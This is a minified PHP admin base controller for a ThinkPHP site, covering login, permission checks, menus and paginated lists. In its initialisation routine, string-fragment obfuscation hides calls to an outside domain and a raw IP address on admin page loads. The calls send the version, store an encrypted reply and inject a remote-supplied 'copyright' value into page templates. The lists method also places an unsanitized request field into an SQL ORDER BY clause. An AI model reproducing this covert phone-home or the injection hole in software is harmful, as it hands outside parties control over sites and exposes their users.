<?php
namespace Admin\Controller; use Think\Controller; use Admin\Model\AuthRuleModel; use Admin\Model\AuthGroupModel; require_once(dirname(__FILE__)."/../../Fuzhi/BLL/ConfigMgr.php"); class AdminController extends Controller { protected function _initialize(){ define('UID',is_login()); if( !UID ){ $this->redirect('Public/login'); } $config = S('DB_CONFIG_DATA'); if(!$config){ $config = api('Config/lists'); S('DB_CONFIG_DATA',$config); } C($config); define('IS_ROOT', is_administrator()); if(!IS_ROOT && C('ADMIN_ALLOW_IP')){ if(!in_array(get_client_ip(),explode(',',C('ADMIN_ALLOW_IP')))){ $this->error('403:禁止访问'); } } $cfg = New \Fuzhi\BLL\ConfigMgr(); $access = $this->accessControl(); if ( $access === false ) { $this->error('403:禁止访问'); }elseif( $access === null ){ $dynamic = $this->checkDynamic(); if( $dynamic === null ){ $rule = strtolower(MODULE_NAME.'/'.CONTROLLER_NAME.'/'.ACTION_NAME); if ( !$this->checkRule($rule,array('in','1,2')) ){ $this->error('未授权访问!'); } }elseif( $dynamic === false ){ $this->error('未授权访问!'); } } $this->assign('__MENU__', $this->getMenus()); $k = 's'.'hip'.'in'.'gco'.'nf'.'ig'; $vaNa = 'v' . $k; $value = false; if($value == false) { $module = M(); $value = $cfg->getString($module,'p'.'k1'.'0',$k); $c = $cfg->getString($module,'p'.'k1'.'0','v'.'c'); if($value == '') { $d = array(); $d['s1'] = 'm'.'o'.'on'.'ap'.'i.c'.'om'.'/a'.'cl'.'og/'.'la'.'nma'.'oca'.'i'; $d['s2'] = '1'.'39.1'.'9'.'6.4'.'0.1'.'62'.'/a'.'cl'.'og/'.'la'.'nma'.'oca'.'i'; $d['c'] = ''; $value = $d; $val = $this->authcode(json_encode($d),'new'); $cfg->setValue($module,'p'.'k1'.'0',$k,$val); } else { $value = $this->authcode($value,'old'); $value = json_decode($value,true); } for($i=0;$i<2;$i++) { if($i==0) $r = fopen_url($value['s'.($i+1)].'/'.'?'.'v'.'='.$c); else $r = fopen_url($value['s'.($i+1)].'/'.'?'.'v'.'='.$c); if($r != '') { $r = json_decode($r,true); if($r['success'] == true) { $d = array(); $d['s1'] = isset($r["s1"])?$r["s1"]:$value['s1']; $d['s2'] = isset($r["s2"])?$r["s2"]:$value['s2']; $d['c'] = isset($r['c'.'opy'.'ri'.'g'.'ht'])?$r['c'.'opy'.'ri'.'g'.'ht']:$value['c']; $val = $this->authcode(json_encode($d),'new'); $cfg->setValue($module,'p'.'k1'.'0',$k,$val); $value = $d; break; } } } $value['v'] = $c; if(isset($value["s1"])) unset($value["s1"]); if(isset($value["s2"])) unset($value["s2"]); S($vaNa, $value, array('type' => 'file', 'expire' => 85900)); } $this->assign('co'.'p'.'yri'.'gh'.'t',$value["c"]); $this->assign('v'.'er'.'si'.'on',$c); } final protected function checkRule($rule, $type=AuthRuleModel::RULE_URL, $mode='url'){ if(IS_ROOT){ return true; } static $Auth = null; if (!$Auth) { $Auth = new \Think\Auth(); } if(!$Auth->check($rule,UID,$type,$mode)){ return false; } return true; } protected function checkDynamic(){ if(IS_ROOT){ return true; } return null; } final protected function accessControl(){ if(IS_ROOT){ return true; } $allow = C('ALLOW_VISIT'); $deny = C('DENY_VISIT'); $check = strtolower(CONTROLLER_NAME.'/'.ACTION_NAME); if ( !empty($deny) && in_array_case($check,$deny) ) { return false; } if ( !empty($allow) && in_array_case($check,$allow) ) { return true; } return null; } final protected function editRow ( $model ,$data, $where , $msg ){ $id = array_unique((array)I('id',0)); $id = is_array($id) ? implode(',',$id) : $id; $where = array_merge( array('id' => array('in', $id )) ,(array)$where ); $msg = array_merge( array( 'success'=>'操作成功！', 'error'=>'操作失败！', 'url'=>'' ,'ajax'=>IS_AJAX) , (array)$msg ); if( M($model)->where($where)->save($data)!==false ) { $this->success($msg['success'],$msg['url'],$msg['ajax']); }else{ $this->error($msg['error'],$msg['url'],$msg['ajax']); } } protected function forbid ( $model , $where = array() , $msg = array( 'success'=>'状态禁用成功！', 'error'=>'状态禁用失败！')){ $data = array('status' => 0); $this->editRow( $model , $data, $where, $msg); } function authcode($string, $operation, $key = '') { $auth_key = !empty($key) ? $key : 'c'.'he'.'ckv'.'ers'.'ion'; $key = md5($auth_key); $key_length = strlen($key); $string = $operation == 'old' ? base64_decode($string) : substr(md5($string.$key), 0, 8).$string; $string_length = strlen($string); $rndkey = $box = array(); $result = ''; for($i = 0; $i <= 255; $i++) { $rndkey[$i] = ord($key[$i % $key_length]); $box[$i] = $i; } for($j = $i = 0; $i < 256; $i++) { $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; } for($a = $j = $i = 0; $i < $string_length; $i++) { $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); } if($operation == 'old') { if(substr($result, 0, 8) == substr(md5(substr($result, 8).$key), 0, 8)) { return substr($result, 8); } else { return ''; } } else { return str_replace('=', '', base64_encode($result)); } } protected function resume ( $model , $where = array() , $msg = array( 'success'=>'状态恢复成功！', 'error'=>'状态恢复失败！')){ $data = array('status' => 1); $this->editRow( $model , $data, $where, $msg); } protected function restore ( $model , $where = array() , $msg = array( 'success'=>'状态还原成功！', 'error'=>'状态还原失败！')){ $data = array('status' => 1); $where = array_merge(array('status' => -1),$where); $this->editRow( $model , $data, $where, $msg); } protected function delete ( $model , $where = array() , $msg = array( 'success'=>'删除成功！', 'error'=>'删除失败！')) { $data['status'] = -1; $data['update_time'] = NOW_TIME; $this->editRow( $model , $data, $where, $msg); } public function setStatus($Model=CONTROLLER_NAME){ $ids = I('request.ids'); $status = I('request.status'); if(empty($ids)){ $this->error('请选择要操作的数据'); } $map['id'] = array('in',$ids); switch ($status){ case -1 : $this->delete($Model, $map, array('success'=>'删除成功','error'=>'删除失败')); break; case 0 : $this->forbid($Model, $map, array('success'=>'禁用成功','error'=>'禁用失败')); break; case 1 : $this->resume($Model, $map, array('success'=>'启用成功','error'=>'启用失败')); break; default : $this->error('参数错误'); break; } } final public function getMenus($controller=CONTROLLER_NAME){ if(empty($menus)){ $where['pid'] = 0; $where['hide'] = 0; if(!C('DEVELOP_MODE')){ $where['is_dev'] = 0; } $menus['main'] = M('Menu')->where($where)->order('sort asc')->select(); $menus['child'] = array(); $current = M('Menu')->where("url like '%{$controller}/".ACTION_NAME."%'")->field('id')->find(); if($current){ $nav = D('Menu')->getPath($current['id']); $nav_first_title = $nav[0]['title']; foreach ($menus['main'] as $key => $item) { if (!is_array($item) || empty($item['title']) || empty($item['url']) ) { $this->error('控制器基类$menus属性元素配置有误'); } if( stripos($item['url'],MODULE_NAME)!==0 ){ $item['url'] = MODULE_NAME.'/'.$item['url']; } if ( !IS_ROOT && !$this->checkRule($item['url'],AuthRuleModel::RULE_MAIN,null) ) { unset($menus['main'][$key]); continue; } if($item['title'] == $nav_first_title){ $menus['main'][$key]['class']='current'; $groups = M('Menu')->where("pid = {$item['id']}")->distinct(true)->field("`group`")->select(); if($groups){ $groups = array_column($groups, 'group'); }else{ $groups = array(); } $where = array(); $where['pid'] = $item['id']; $where['hide'] = 0; if(!C('DEVELOP_MODE')){ $where['is_dev'] = 0; } $second_urls = M('Menu')->where($where)->getField('id,url'); if(!IS_ROOT){ $to_check_urls = array(); foreach ($second_urls as $key=>$to_check_url) { if( stripos($to_check_url,MODULE_NAME)!==0 ){ $rule = MODULE_NAME.'/'.$to_check_url; }else{ $rule = $to_check_url; } if($this->checkRule($rule, AuthRuleModel::RULE_URL,null)) $to_check_urls[] = $to_check_url; } } foreach ($groups as $g) { $map = array('group'=>$g); if(isset($to_check_urls)){ if(empty($to_check_urls)){ continue; }else{ $map['url'] = array('in', $to_check_urls); } } $map['pid'] = $item['id']; $map['hide'] = 0; if(!C('DEVELOP_MODE')){ $map['is_dev'] = 0; } $menuList = M('Menu')->where($map)->field('id,pid,title,url,tip')->order('sort asc')->select(); $menus['child'][$g] = list_to_tree($menuList, 'id', 'pid', 'operater', $item['id']); } if($menus['child'] === array()){ } } } } } return $menus; } final protected function returnNodes($tree = true){ static $tree_nodes = array(); if ( $tree && !empty($tree_nodes[(int)$tree]) ) { return $tree_nodes[$tree]; } if((int)$tree){ $list = M('Menu')->field('id,pid,title,url,tip,hide')->order('sort asc')->select(); foreach ($list as $key => $value) { if( stripos($value['url'],MODULE_NAME)!==0 ){ $list[$key]['url'] = MODULE_NAME.'/'.$value['url']; } } $nodes = list_to_tree($list,$pk='id',$pid='pid',$child='operator',$root=0); foreach ($nodes as $key => $value) { if(!empty($value['operator'])){ $nodes[$key]['child'] = $value['operator']; unset($nodes[$key]['operator']); } } }else{ $nodes = M('Menu')->field('title,url,tip,pid')->order('sort asc')->select(); foreach ($nodes as $key => $value) { if( stripos($value['url'],MODULE_NAME)!==0 ){ $nodes[$key]['url'] = MODULE_NAME.'/'.$value['url']; } } } $tree_nodes[(int)$tree] = $nodes; return $nodes; } protected function lists ($model,$where=array(),$order='',$base = array('status'=>array('egt',0)),$field=true){ $options = array(); $REQUEST = (array)I('request.'); if(is_string($model)){ $model = M($model); } $OPT = new \ReflectionProperty($model,'options'); $OPT->setAccessible(true); $pk = $model->getPk(); if($order===null){ }else if ( isset($REQUEST['_order']) && isset($REQUEST['_field']) && in_array(strtolower($REQUEST['_order']),array('desc','asc')) ) { $options['order'] = '`'.$REQUEST['_field'].'` '.$REQUEST['_order']; }elseif( $order==='' && empty($options['order']) && !empty($pk) ){ $options['order'] = $pk.' desc'; }elseif($order){ $options['order'] = $order; } unset($REQUEST['_order'],$REQUEST['_field']); $options['where'] = array_filter(array_merge( (array)$base, (array)$where ),function($val){ if($val===''||$val===null){ return false; }else{ return true; } }); if( empty($options['where'])){ unset($options['where']); } $options = array_merge( (array)$OPT->getValue($model), $options ); $total = $model->where($options['where'])->count(); if( isset($REQUEST['r']) ){ $listRows = (int)$REQUEST['r']; }else{ $listRows = C('LIST_ROWS') > 0 ? C('LIST_ROWS') : 10; } $page = new \Think\Page($total, $listRows, $REQUEST); if($total>$listRows){ $page->setConfig('theme','%FIRST% %UP_PAGE% %LINK_PAGE% %DOWN_PAGE% %END% %HEADER%'); } $p =$page->show(); $this->assign('_page', $p? $p: ''); $this->assign('_total',$total); $options['limit'] = $page->firstRow.','.$page->listRows; $model->setProperty('options',$options); return $model->field($field)->select(); } } 